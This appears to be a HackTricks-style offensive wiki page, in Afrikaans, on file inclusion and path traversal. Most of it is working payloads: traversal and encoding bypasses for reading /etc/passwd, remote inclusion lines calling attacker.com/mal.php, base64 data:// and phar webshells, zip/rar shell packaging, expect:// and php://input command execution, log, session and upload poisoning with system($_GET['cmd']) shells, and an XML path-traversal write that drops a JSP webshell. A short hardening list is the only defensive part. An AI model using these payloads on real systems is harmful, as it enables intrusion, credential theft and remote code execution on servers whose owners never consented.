# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Die lêer word vanaf 'n afgeleë bediener gelaai (Beste: jy kan die kode skryf en die bediener sal dit uitvoer). In php is dit standaard **uitgeskakel** (**allow_url_include**).\
**Local File Inclusion (LFI):** Die bediener laai 'n plaaslike lêer.

Die kwesbaarheid ontstaan wanneer die gebruiker op een of ander manier die lêer kan beheer wat deur die bediener gelaai gaan word.

Kwetsbare **PHP functions**: require, require_once, include, include_once

'n Interessante hulpmiddel om hierdie kwesbaarheid te eksploiteer: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interessant - LFI2RCE lêers
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Deur verskeie *nix LFI-lyste te meng en meer paaie by te voeg het ek hierdie een geskep:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Probeer ook om `/` vir `\` te verander\
Probeer ook om `../../../../../` by te voeg

A list that uses several techniques to find the file /etc/password (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Samevoeging van verskillende wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Probeer ook om `/` vir `\` te verander\
Probeer ook om `C:/` te verwyder en `../../../../../` by te voeg

A list that uses several techniques to find the file /boot.ini (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Kyk na die LFI-lys van linux.

## Basiese LFI en omseilings

Al die voorbeelde is vir Local File Inclusion maar kan ook op Remote File Inclusion toegepas word (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences verwyder nie-rekursief
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass die toevoeging van meer karakters aan die einde van die verskafte string (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Dit is **opgelos sedert PHP 5.4**

### **Kodering**

Jy kan nie-standaard koderinge gebruik soos double URL encode (en ander):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Vanaf bestaande gids

Miskien kontroleer die back-end die gids pad:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Verkenning van Lêerstelselgidse op 'n Server

Die lêerstelsel van 'n server kan rekursief verken word om gidse, nie net lêers nie, te identifiseer deur sekere tegnieke toe te pas. Hierdie proses behels die bepaling van die gidsdiepte en die toetsing vir die bestaan van spesifieke vouers. Hieronder is 'n gedetailleerde metode om dit te bereik:

1. **Bepaal gidsdiepte:** Vind die diepte van jou huidige gids deur suksesvol die `/etc/passwd`-lêer te haal (toepaslik as die server is Linux-based). 'n Voorbeeld-URL kan soos volg gestruktureer wees, wat 'n diepte van drie aandui:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Soek na gidse:** Voeg die naam van die vermoedlike gids (bv. `private`) by die URL, en navigeer dan terug na `/etc/passwd`. Die bykomende gidsvlak vereis dat die diepte met een verhoog word:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpreteer die uitkomste:** Die bediener se reaksie dui aan of die gids bestaan:
- **Fout / Geen Uitvoer:** Die gids `private` bestaan waarskynlik nie by die gespesifiseerde ligging nie.
- **Inhoud van `/etc/passwd`:** Die teenwoordigheid van die `private` gids word bevestig.
4. **Rekursiewe Verkenning:** Gevonde gidses kan verder ondersoek word vir subgidse of lêers met dieselfde tegniek of tradisionele Local File Inclusion (LFI)-metodes.

Om gidses op verskillende plekke in die lêerstelsel te verken, pas die payload dienooreenkomstig aan. Byvoorbeeld, om te kyk of `/var/www/` 'n `private` gids bevat (aangesien die huidige gids op 'n diepte van 3 is), gebruik:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation is 'n metode wat gebruik word om lêerpaaie in webtoepassings te manipuleer. Dit word dikwels gebruik om toegang tot beperkte lêers te kry deur sekere veiligheidsmaatreëls te omseil wat addisionele karakters aan die einde van lêerpaaie toevoeg. Die doel is om 'n lêerpad te konstrueer wat, sodra dit deur die veiligheidsmaatreël verander is, steeds na die gewenste lêer wys.

In PHP kan verskeie voorstellings van 'n lêerpad as ekwivalent beskou word weens die aard van die lêerstelsel. Byvoorbeeld:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, en `/etc/passwd/` word almal as dieselfde pad behandel.
- Wanneer die laaste 6 karakters `passwd` is, verander die toevoeging van 'n `/` (waardeur dit `passwd/` word) nie die geteikende lêer nie.
- Op dieselfde manier, as `.php` aan 'n lêerpad aangeheg word (soos `shellcode.php`), sal die toevoeging van `/.` aan die einde nie die betrokke lêer wat geraadpleeg word, verander nie.

Die verskafde voorbeelde demonstreer hoe om path truncation te gebruik om toegang tot `/etc/passwd` te kry, 'n algemene teiken weens sy sensitiewe inhoud (gebruikersrekeninginligting):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In hierdie scenario's kan die aantal traversals wat benodig word rondom 2027 wees, maar hierdie getal kan wissel afhangende van die bediener se konfigurasie.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) gekombineer met ekstra dot segments en karakters kan gebruik word om deur die lêerstelsel te navigeer, en effektief aangehegte stringe deur die bediener te ignoreer.
- **Determining the Required Number of Traversals**: Deur proef-en-fout kan iemand die presiese aantal `../` sequences vind wat nodig is om na die wortelgids te navigeer en daarna na `/etc/passwd`, en te verseker dat enige aangehegte stringe (soos `.php`) geneutraliseer word maar die verlangde pad (`/etc/passwd`) onaangeraak bly.
- **Starting with a Fake Directory**: Dit is algemene praktyk om die pad te begin met 'n nie-bestaande gids (soos `a/`). Hierdie tegniek word gebruik as 'n voorsorgmaatreël of om aan die vereistes van die bediener se pad-ontledingslogika te voldoen.

Wanneer path truncation techniques gebruik word, is dit kritiek om die bediener se pad-ontledingsgedrag en lêerstelselstruktuur te verstaan. Elke scenario kan 'n ander benadering benodig, en toetsing is dikwels nodig om die doeltreffendste metode te vind.

**Hierdie kwesbaarheid is reggestel in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

In php is dit standaard gedeaktiveer omdat **`allow_url_include`** **Off** is. Dit moet op **On** wees om te werk, en in daardie geval kan jy 'n PHP-lêer vanaf jou server insluit en RCE kry:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Indien om een of ander rede **`allow_url_include`** is **On**, maar PHP is **filtering** toegang tot eksterne webbladsye, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), kan jy byvoorbeeld die data-protokol met base64 gebruik om 'n b64 PHP-kode te decodeer en RCE te kry:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> In die vorige kode is die finale `+.txt` bygevoeg omdat die aanvaller 'n string benodig het wat op `.txt` eindig, dus eindig die string daarmee en nadat die b64 decode plaasgevind het sal daardie deel net gemors teruggee en die werklike PHP code ingesluit word (en daarom uitgevoer word).

Nog 'n voorbeeld **wat nie die `php://` protokol gebruik nie** sou wees:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python wortelelement

In python in 'n kode soos hierdie:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
As die gebruiker 'n **absolute path** aan **`file_name`** deurgee, word die **vorige path** net verwyder:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Dit is die bedoelde gedrag volgens [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> As 'n komponent 'n absolute pad is, word alle vorige komponente weggegooi en gaan samvoeging voort vanaf die absolute pad-komponent.

## Java lys van gidse

Dit lyk of as jy 'n Path Traversal in Java het en jy **vra vir 'n gids** in plaas van 'n lêer, 'n **gidslys teruggestuur word**. Dit sal nie in ander tale gebeur nie (sover ek weet).

## Top 25 parameters

Hier is 'n lys van top 25 parameters wat kwesbaar kan wees vir local file inclusion (LFI) kwetsbaarhede (van [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP-filters laat basiese **wysigingsoperasies op die data** toe voordat dit gelees of geskryf word. Daar is 5 kategorieë filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Verwyder tags uit die data (alles tussen die "<" en ">" karakters)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transformeer na 'n ander kodering (`convert.iconv.<input_enc>.<output_enc>`). Om die **lys van alle koderinge** wat ondersteun word te kry, voer in die konsole uit: `iconv -l`

> [!WARNING]
> Deur die `convert.iconv.*` konversiefilter te misbruik kan jy **arbitrêre teks genereer**, wat nuttig kan wees om arbitrêre teks te skryf of 'n funksie soos include te laat verwerk arbitrêre teks. Vir meer inligting sien [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Compress the content (useful if exfiltrating a lot of info)
- `zlib.inflate`: Decompress the data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*`: Verouderd
- `mdecrypt.*`: Verouderd
- Other Filters
- Deur in PHP `var_dump(stream_get_filters());` uit te voer kan jy 'n paar **onverwagte filters** vind:
- `consumed`
- `dechunk`: reverses HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Die deel "php://filter" is case insensitive

### Gebruik van php filters as oracle om arbitrêre lêers te lees

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) word 'n tegniek voorgestel om 'n plaaslike lêer te lees sonder om die output terug van die server te kry. Hierdie tegniek is gebaseer op 'n **boolean exfiltration of the file (char by char) using php filters** as oracle. Dit is omdat php filters gebruik kan word om 'n teks groot genoeg te maak sodat php 'n exception gooi.

In die oorspronklike post vind jy 'n gedetaileerde verduideliking van die tegniek, maar hier is 'n vinnige opsomming:

- Gebruik die codec **`UCS-4LE`** om die leidende karakter van die teks aan die begin te laat en om die grootte van die string eksponensieel te laat toeneem.
- Dit sal gebruik word om 'n **teks te genereer wat so groot is wanneer die aanvanklike letter korrek geraai word** dat php 'n **error** sal veroorsaak.
- Die **dechunk** filter sal **alles verwyder as die eerste char nie 'n hexadecimal is nie**, sodat ons kan weet of die eerste char hex is.
- Dit, gekombineer met die vorige (en ander filters afhangend van die geraaide letter), sal ons toelaat om 'n letter aan die begin van die teks te raai deur te sien wanneer ons genoeg transformasies doen om dit nie meer 'n hexadecimal karakter te laat wees nie. Want as dit hex is, sal dechunk dit nie verwyder nie en die aanvanklike bom sal php 'n error laat gooi.
- Die codec **convert.iconv.UNICODE.CP930** transformeer elke letter in die volgende een (so na hierdie codec: a -> b). Dit laat ons toe om te ontdek of die eerste letter byvoorbeeld 'n `a` is, want as ons 6 keer hierdie codec toepas a->b->c->d->e->f->g is die letter nie meer 'n hexadecimal karakter nie, daarom verwyder dechunk dit nie en die php error word getrigger omdat dit met die aanvanklike bom vermenigvuldig.
- Deur ander transformasies soos **rot13** aan die begin te gebruik is dit moontlik om ander chars te leak soos n, o, p, q, r (en ander codecs kan gebruik word om ander letters in die hex-bereik te skuif).
- Wanneer die aanvanklike char 'n nommer is, is dit nodig om dit base64 te encode en die eerste 2 letters te leak om die nommer te leak.
- Die finale probleem is om te sien **hoe om meer as die aanvanklike letter te leak**. Deur order memory filters soos **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** te gebruik is dit moontlik om die volgorde van die chars te verander en ander letters van die teks in die eerste posisie te kry.
- En om verder data te kan bekom, is die idee om **2 bytes junk data aan die begin te genereer** met **convert.iconv.UTF16.UTF16**, **UCS-4LE** toe te pas om dit **te pivot met die volgende 2 bytes**, en die data te **delete tot by die junk data** (dit sal die eerste 2 bytes van die aanvanklike teks verwyder). Gaan voort om dit te doen totdat jy by die gewenste bit kom om te leak.

In die post is 'n tool om dit outomaties uit te voer ook leaked: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Hierdie wrapper laat toe om toegang te kry tot file descriptors wat die proses oop het. Potensieel nuttig om die inhoud van opened files te exfiltrate:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Jy kan ook **php://stdin, php://stdout and php://stderr** gebruik om onderskeidelik toegang tot die **file descriptors 0, 1 and 2** te kry (nie seker hoe dit in 'n aanval nuttig kan wees nie)

### zip:// and rar://

Laai 'n Zip of Rar-lêer met 'n PHPShell binne en kry toegang daartoe.\
Om die rar-protokol te kan misbruik moet dit **spesifiek geaktiveer wees**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Neem kennis dat hierdie protokol beperk word deur php-konfigurasies **`allow_url_open`** en **`allow_url_include`**

### expect://

Expect moet geaktiveer wees. Jy kan code hiermee uitvoer:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Spesifiseer jou payload in die POST parameters:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

'n `.phar`-lêer kan gebruik word om PHP-kode uit te voer wanneer 'n webtoepassing funksies soos `include` vir lêerlaai gebruik. Die PHP-kodefragment hieronder demonstreer die skep van 'n `.phar`-lêer:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Om die `.phar` lêer te kompileer, moet die volgende opdrag uitgevoer word:
```bash
php --define phar.readonly=0 create_path.php
```
By uitvoering sal 'n lêer met die naam `test.phar` geskep word, wat moontlik benut kan word om Local File Inclusion (LFI)-kwesbaarhede uit te buit.

In gevalle waar die LFI slegs lêers lees sonder om die PHP-kode daarin uit te voer — byvoorbeeld deur funksies soos `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, of `filesize()` — kan 'n uitbuiting van 'n deserialization vulnerability probeer word. Hierdie kwesbaarheid hang saam met die lees van lêers deur die `phar` protocol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Dit was moontlik om **any arbitrary file read from PHP that supports php filters** te misbruik om 'n RCE te kry. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Baie kort opsomming: 'n **3 byte overflow** in die PHP heap is misbruik om die **alter the chain of free chunks** van anspecific grootte te verander sodat dit moontlik was om **write anything in any address**, daarom is 'n hook bygevoeg om **`system`** aan te roep.\
Dit was moontlik om alloc chunks van spesifieke groottes te skep deur meer php filters te misbruik.

### Meer protokolle

Kyk na meer moontlike[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Skryf in geheue of in 'n tydelike lêer (nie seker hoe dit nuttig kan wees in 'n file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Toegang tot plaaslike lêerstelsel
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Toegang tot HTTP(s) URL's
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Toegang tot FTP(s)-URL's
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompressiestrome
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Vind pathnames wat by 'n patroon pas (dit lewer niks drukbaars terug, so nie regtig nuttig hier nie)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio-strome (nie nuttig om arbitrary files te lees nie)

## LFI via PHP's 'assert'

Local File Inclusion (LFI)-risiko's in PHP is besonder hoog wanneer die 'assert' funksie betrokke is, aangesien dit kode binne stringe kan uitvoer. Dit is veral problematies as input wat directory traversal karakters soos ".." bevat, gekontroleer word maar nie behoorlik gesaniteer nie.

Byvoorbeeld, PHP-kode mag ontwerp wees om directory traversal soos volg te voorkom:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Alhoewel dit daarop gemik is om traversal te stop, skep dit onbedoeld 'n vektor vir code injection. Om dit te exploit om lêerinhoud te lees, kan 'n attacker gebruik:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Net so, om ewekansige stelselopdragte uit te voer, kan 'n mens gebruik:
```plaintext
' and die(system("id")) or '
```
Dit is belangrik om hierdie payloads te **URL-encode**.

## PHP Blind Path Traversal

> [!WARNING]
> Hierdie tegniek is relevant in gevalle waar jy die **lêerpad** van 'n **PHP-funksie** beheer wat 'n **lêer** sal aangryp, maar jy sien nie die inhoud van die lêer nie (soos 'n eenvoudige oproep na **`file()`**) omdat die inhoud nie vertoon word.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) word verduidelik hoe 'n blind path traversal via 'n PHP filter misbruik kan word om die inhoud van 'n lêer via 'n error oracle te **exfiltrate**.

In samevatting gebruik die tegniek die **"UCS-4LE" encoding** om die inhoud van 'n lêer so **groot** te maak dat die **PHP-funksie wat die lêer oopmaak** 'n **fout** sal veroorsaak.

Daarna, om die eerste karakter te leak, word die filter **`dechunk`** saam met ander soos **base64** of **rot13** gebruik en uiteindelik word die filters **convert.iconv.UCS-4.UCS-4LE** en **convert.iconv.UTF16.UTF-16BE** gebruik om **ander karakters aan die begin te plaas en hulle te leak**.

**Funksies wat moontlik kwesbaar is**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Vir die tegniese besonderhede, sien die genoemde post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Wanneer server-side kode wat lêers inlees/upload verwerk die bestemmingpad bou met gebruiker-beheerde data (bv. 'n filename of URL) sonder om dit te canonicaliseer en te valideer, kan `..` segments en absolute paths uit die beoogde gids ontsnap en 'n arbitrary file write veroorsaak. As jy die payload onder 'n web-exposed directory kan plaas, kry jy gewoonlik unauthenticated RCE deur 'n webshell te drop.

Tipiese uitbuitingstroom:
- Identifiseer 'n write primitive in 'n endpoint of background worker wat 'n pad/filename aanvaar en inhoud na die skyf skryf (bv. message-driven ingestion, XML/JSON command handlers, ZIP extractors, ens.).
- Bepaal web-exposed directories. Algemene voorbeelde:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Stel 'n traversal path saam wat uit die beoogde stoor-gids uitbreek na die webroot, en sluit jou webshell inhoud in.
- Blaai na die dropped payload en voer opdragte uit.

Nota:
- Die kwesbare diens wat die skryf uitvoer mag na 'n non-HTTP poort luister (bv. 'n JMF XML listener op TCP 4004). Die hoof web portal (verskillende poort) sal later jou payload bedien.
- Op Java stacks word hierdie file writes dikwels geïmplementeer met eenvoudige `File`/`Paths` concatenation. Gebrek aan canonicalisation/allow-listing is die kernfout.

Generiese XML/JMF-styl voorbeeld (produk-skemas verskil – die DOCTYPE/body wrapper is irrelevant vir die traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Verharding wat hierdie klas foute teëwerk:
- Los op na 'n canonical path en dwing af dat dit 'n afstammeling van 'n allow-listed base directory is.
- Weier enige path wat `..`, absolute roots, of drive letters bevat; verkies gegenereerde filenames.
- Laat die writer loop as 'n laag-privilege rekening en skei write directories van served roots.

## Remote File Inclusion

Eerder verduidelik, [**volg hierdie skakel**](#remote-file-inclusion).

### Via Apache/Nginx log file

As die Apache of Nginx-bediener **vulnerable to LFI** binne die include-funksie is, kan jy probeer toegang kry tot **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, en in die **user agent** of in 'n **GET parameter** 'n php shell soos **`<?php system($_GET['c']); ?>`** plaas en daardie lêer include.

> [!WARNING]
> Let wel dat **as jy dubbele aanhalingstekens gebruik** vir die shell in plaas van **simple quotes**, die dubbele aanhalingstekens verander sal word na die string "_**quote;**_", **PHP sal 'n fout gooi** daar en **niks anders sal uitgevoer word**.
>
> Maak ook seker dat jy die **payload korrek skryf** anders sal PHP elke keer 'n fout gee wanneer dit probeer die log-lêer laai en jy sal nie 'n tweede geleentheid hê nie.

Dit kan ook in ander logs gedoen word, maar **wees versigtig,** die kode binne die logs kan URL encoded wees en dit kan die Shell vernietig. Die header **authorisation "basic"** bevat "user:password" in Base64 en dit word binne die logs gedekodeer. Die PHPShell kan in hierdie header ingesit word.\
Ander moontlike log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing woordlys: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via E-pos

**Stuur 'n e-pos** na 'n interne rekening (user@localhost) wat jou PHP payload bevat soos `<?php echo system($_REQUEST["cmd"]); ?>` en probeer om die e-pos van die gebruiker in te sluit met 'n pad soos **`/var/mail/<USERNAME>`** of **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Laai baie shells op (byvoorbeeld: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), met $PID = PID van die proses (kan deur brute force bepaal word) en $FD = die lêerbeskrywer (kan ook deur brute force bepaal word)

### Via /proc/self/environ

Soortgelyk aan 'n log-lêer: stuur die payload in die User-Agent; dit sal weerspieël word in die /proc/self/environ-lêer
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

As jy 'n lêer kan upload, inject net die shell payload daarin (bv: `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Om die lêer leesbaar te hou, is dit die beste om dit in die metadata van pictures/doc/pdf in te voeg

### Deur ZIP-lêer op te laai

Laai 'n ZIP-lêer op wat 'n saamgeperste PHP shell bevat en toegang:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Deur PHP-sessies

Kontroleer of die webwerf PHP-sessies gebruik (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP word hierdie sessies gestoor in _/var/lib/php5/sess\\_\[PHPSESSID]\_ lêers
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Stel die cookie in op `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Gebruik die LFI om die PHP-sessie-lêer in te sluit
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Deur ssh

As ssh aktief is, kyk watter gebruiker gebruik word (/proc/self/status & /etc/passwd) en probeer toegang kry tot **\<HOME>/.ssh/id_rsa**

### **Deur** **vsftpd** _**loglêers**_

Die loglêers vir die FTP-bediener vsftpd is geleë by _**/var/log/vsftpd.log**_. In die scenario waar 'n Local File Inclusion (LFI) kwesbaarheid bestaan, en toegang tot 'n blootgestelde vsftpd-bediener moontlik is, kan die volgende stappe oorweeg word:

1. Inspuit 'n PHP payload in die gebruikersnaamveld tydens die aanmeldproses.
2. Na inspuiting, gebruik die LFI om die bedienerloglêers van _**/var/log/vsftpd.log**_ te haal.

### Deur php base64 filter (met base64)

Soos in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artikel aangetoon, ignoreer die PHP base64-filter karakters wat nie base64 is nie. Jy kan dit gebruik om die kontrole op lênaansluitings te omseil: as jy base64 voorsien wat op ".php" eindig, sal die filter die "." eenvoudig ignoreer en "php" aan die base64 heg. Hier is 'n voorbeeldpayload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
